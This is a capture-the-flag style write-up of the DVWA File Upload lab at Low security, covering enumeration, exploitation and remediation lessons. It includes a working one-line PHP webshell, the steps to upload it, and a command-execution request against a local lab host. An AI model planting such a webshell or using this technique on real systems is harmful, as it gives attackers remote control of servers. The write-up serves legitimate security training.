File Upload — Low

Enumeration

Objective

Observe how the upload form behaves — what file types it accepts, whether any client-side or server-side restrictions exist, and where uploaded files are stored.

Findings

The File Upload page presents a simple form prompting the user to “Choose an image to upload.” There is no visible client-side restriction on accepted file types. To probe server-side behavior, a benign image file (image.png) was uploaded. The server accepted it and returned the success message: ../../hackable/uploads/image.png succesfully uploaded! — directly disclosing the relative path to the upload directory. Resolving this against the application’s base URL confirmed that uploaded files are stored at /dvwa/hackable/uploads/ and are web-accessible, meaning any uploaded file can be retrieved directly via HTTP. No MIME type check, extension validation, or content inspection was performed.

PoC:
- Tools used: Browser
- Command: Upload image.png via the form
- Key finding: Server response disclosed the upload path — ../../hackable/uploads/image.png — confirming web-accessible storage with no file type restrictions

Exploitation — Unrestricted File Upload (Remote Code Execution)

Description

The application accepts any file type without validation, allowing an attacker to upload a PHP webshell directly. Because the upload directory is web-accessible, the uploaded script can be requested through the browser and will be executed by the server-side PHP interpreter, resulting in remote code execution under the web server’s user context (www-data).

PoC — Steps to Reproduce

  1. A PHP webshell was created — RCE.php, containing <?php system($_GET['cmd']); ?> — and selected via the Browse button on the DVWA File Upload page.
  2. Click Upload — the application accepts the file with no validation error and confirms: ../../hackable/uploads/RCE.php succesfully uploaded!
  3. Navigate to http://127.0.0.1/dvwa/hackable/uploads/RCE.php?cmd=id in the browser.
  4. The server executes the command and returns: uid=33(www-data) gid=33(www-data) groups=33(www-data) — confirming RCE as the web server user.

Lessons Learned

At the Low security level, the application performs no file type validation whatsoever — not on the extension, the MIME type, or the file’s magic bytes. Any file, including executable PHP scripts, can be uploaded and then triggered directly through the browser. The disclosure of the upload path in the success message further simplifies exploitation by eliminating any need to guess where the file was stored.

The fix at higher security levels involves restricting accepted MIME types on the server side, validating file extensions against an allowlist, and ideally storing uploads outside the web root so they cannot be directly requested. The Medium level introduces MIME type checking, and the High level adds extension validation — both of which require different bypass techniques.
